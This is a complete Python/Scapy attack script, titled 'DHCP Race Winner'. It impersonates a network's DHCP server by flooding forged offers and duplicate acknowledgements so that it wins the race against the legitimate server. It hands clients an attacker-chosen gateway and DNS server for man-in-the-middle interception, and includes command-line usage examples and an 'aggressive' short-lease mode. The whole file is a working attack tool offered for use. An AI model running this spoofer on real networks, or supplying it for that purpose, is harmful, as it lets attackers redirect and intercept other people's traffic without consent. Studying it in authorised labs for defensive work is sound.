#!/usr/bin/env python3

from scapy.all import *
import argparse
import ipaddress
import random
import sys
import os
import signal
import threading
import time
from collections import deque
from termcolor import colored

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

def handler(sig, frame):
    print(colored("\n[!] Stopping...\n", 'red'))
    sys.exit(0)

signal.signal(signal.SIGINT, handler)

def get_arguments():
    parser = argparse.ArgumentParser(
        description="DHCP Race Winner - Optimized for speed",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  sudo python3 dhcp_race.py -i eth0 -p 192.168.1.0/24 -g 192.168.1.100
  sudo python3 dhcp_race.py -i eth0 -p 192.168.1.0/24 -g 192.168.1.100 -f 10 -a
        """
    )
    
    parser.add_argument("-i", "--interface", required=True, help="Network interface")
    parser.add_argument("-p", "--pool", required=True, help="Network pool (CIDR)")
    parser.add_argument("-g", "--gateway", required=True, help="Gateway (MitM)")
    parser.add_argument("-d", "--dns", default="8.8.8.8", help="DNS server")
    parser.add_argument("-f", "--flood", type=int, default=5, help="OFFERs per DISCOVER (default: 5)")
    parser.add_argument("-a", "--aggressive", action="store_true", help="Aggressive mode (short leases)")
    
    return parser.parse_args()

def get_mac(interface):
    return get_if_hwaddr(interface)

def get_ip(interface):
    try:
        return get_if_addr(interface)
    except:
        return "192.168.1.100"

class FastDHCPSpoofer:
    def __init__(self, interface, pool, gateway, dns, flood_count=5, aggressive=False):
        self.interface = interface
        self.pool = pool
        self.gateway = gateway
        self.dns = dns
        self.flood_count = flood_count
        self.aggressive = aggressive
        
        self.server_ip = get_ip(interface)
        self.server_mac = get_mac(interface)
        network = ipaddress.ip_network(pool, strict=False)
        self.subnet_mask = str(network.netmask)
        self.broadcast = str(network.broadcast_address)
        
        # Pre-generate IP queue for O(1) assignment
        hosts = list(network.hosts())[1:-1]
        random.shuffle(hosts)  # Randomize to avoid patterns
        self.ip_queue = deque(hosts)
        self.assigned_ips = {}
        self.lock = threading.Lock()
        
        # Lease time
        self.lease_time = 60 if aggressive else 3600
        
        # Pre-create socket for faster sending
        self.sock = conf.L2socket(iface=interface)
        
        # Stats
        self.offers_sent = 0
        self.acks_sent = 0
        
    def get_ip_fast(self, mac):
        """Ultra-fast IP assignment"""
        with self.lock:
            if mac in self.assigned_ips:
                return self.assigned_ips[mac]
            if not self.ip_queue:
                return None
            ip = str(self.ip_queue.popleft())
            self.assigned_ips[mac] = ip
            return ip
    
    def build_offer(self, discover, client_ip, unicast=False):
        """Build offer packet - optimized"""
        client_mac = discover[Ether].src
        xid = discover[BOOTP].xid
        
        options = [
            ('message-type', 2),
            ('server_id', self.server_ip),
            ('lease_time', self.lease_time),
            ('renewal_time', self.lease_time // 2),
            ('subnet_mask', self.subnet_mask),
            ('router', self.gateway),
            ('name_server', self.dns),
            ('broadcast_address', self.broadcast),
            'end'
        ]
        
        dst_mac = client_mac if unicast else "ff:ff:ff:ff:ff:ff"
        
        pkt = Ether(src=self.server_mac, dst=dst_mac) / \
              IP(src=self.server_ip, dst="255.255.255.255", ttl=128) / \
              UDP(sport=67, dport=68) / \
              BOOTP(op=2, htype=1, hlen=6, hops=0, xid=xid, flags=0x8000,
                    ciaddr="0.0.0.0", yiaddr=client_ip, siaddr=self.server_ip,
                    giaddr="0.0.0.0",
                    chaddr=bytes.fromhex(client_mac.replace(':', '')) + b'\x00'*10) / \
              DHCP(options=options)
        
        return pkt
    
    def build_ack(self, request, client_ip):
        """Build ACK packet - optimized"""
        client_mac = request[Ether].src
        xid = request[BOOTP].xid
        
        options = [
            ('message-type', 5),
            ('server_id', self.server_ip),
            ('lease_time', self.lease_time),
            ('subnet_mask', self.subnet_mask),
            ('router', self.gateway),
            ('name_server', self.dns),
            'end'
        ]
        
        pkt = Ether(src=self.server_mac, dst=client_mac) / \
              IP(src=self.server_ip, dst="255.255.255.255") / \
              UDP(sport=67, dport=68) / \
              BOOTP(op=2, htype=1, hlen=6, hops=0, xid=xid, flags=0x8000,
                    ciaddr="0.0.0.0", yiaddr=client_ip, siaddr=self.server_ip,
                    giaddr="0.0.0.0",
                    chaddr=bytes.fromhex(client_mac.replace(':', '')) + b'\x00'*10) / \
              DHCP(options=options)
        
        return pkt
    
    def race_flood_offers(self, discover, client_ip):
        """RACE CONDITION: Flood offers as fast as possible"""
        # Send first unicast immediately (fastest path)
        pkt = self.build_offer(discover, client_ip, unicast=True)
        self.sock.send(pkt)
        self.offers_sent += 1
        
        # Then flood broadcasts with micro-delays
        for i in range(self.flood_count - 1):
            pkt = self.build_offer(discover, client_ip, unicast=False)
            self.sock.send(pkt)
            self.offers_sent += 1
            # Minimal delay to prevent NIC buffer overflow
            if i < self.flood_count - 2:
                time.sleep(0.001)
    
    def handle_discover(self, pkt):
        """Handle DISCOVER - priority speed"""
        client_mac = pkt[Ether].src
        client_ip = self.get_ip_fast(client_mac)
        
        if not client_ip:
            return
        
        # RACE: Send offers immediately in same thread (no overhead)
        self.race_flood_offers(pkt, client_ip)
        
        if self.offers_sent % 50 == 0:
            print(colored(f"[+] Race stats: {self.offers_sent} OFFERs, {self.acks_sent} ACKs", 'cyan'))
    
    def handle_request(self, pkt):
        """Handle REQUEST"""
        client_mac = pkt[Ether].src
        
        # Check if requesting our offer
        with self.lock:
            client_ip = self.assigned_ips.get(client_mac)
        
        if not client_ip:
            return
        
        # Send ACK immediately
        ack = self.build_ack(pkt, client_ip)
        self.sock.send(ack)
        
        # Send second ACK for redundancy
        time.sleep(0.005)
        self.sock.send(ack)
        
        self.acks_sent += 1
        print(colored(f"[!] WON RACE: {client_mac} -> {client_ip}", 'green'))
    
    def run(self):
        """Main loop - optimized for minimal latency"""
        print(colored("\n[*] RACE MODE ACTIVATED", 'blue', attrs=['bold']))
        print(f"[*] Interface: {self.interface}")
        print(f"[*] Gateway: {self.gateway}")
        print(f"[*] Flood: {self.flood_count} OFFERs per DISCOVER")
        print(colored("[!] Racing against legitimate DHCP...\n", 'yellow', attrs=['bold']))
        
        # Use socket directly for maximum speed
        sniff_socket = conf.L2socket(iface=self.interface)
        
        try:
            while True:
                pkt = sniff_socket.recv()
                if not pkt:
                    continue
                
                if DHCP in pkt:
                    dhcp_type = pkt[DHCP].options[0][1]
                    
                    if dhcp_type == 1:  # DISCOVER
                        self.handle_discover(pkt)
                    elif dhcp_type == 3:  # REQUEST
                        self.handle_request(pkt)
                        
        except KeyboardInterrupt:
            pass
        finally:
            sniff_socket.close()
            self.sock.close()

def main():
    if os.geteuid() != 0:
        print(colored("[-] Need root privileges", 'red'))
        sys.exit(1)
    
    args = get_arguments()
    
    # Validate
    network = ipaddress.ip_network(args.pool, strict=False)
    if ipaddress.ip_address(args.gateway) not in network:
        print(colored("[-] Gateway not in pool", 'red'))
        sys.exit(1)
    
    spoofer = FastDHCPSpoofer(
        args.interface, args.pool, args.gateway, args.dns,
        args.flood, args.aggressive
    )
    
    try:
        spoofer.run()
    except Exception as e:
        print(colored(f"[-] Error: {e}", 'red'))

if __name__ == "__main__":
    main()
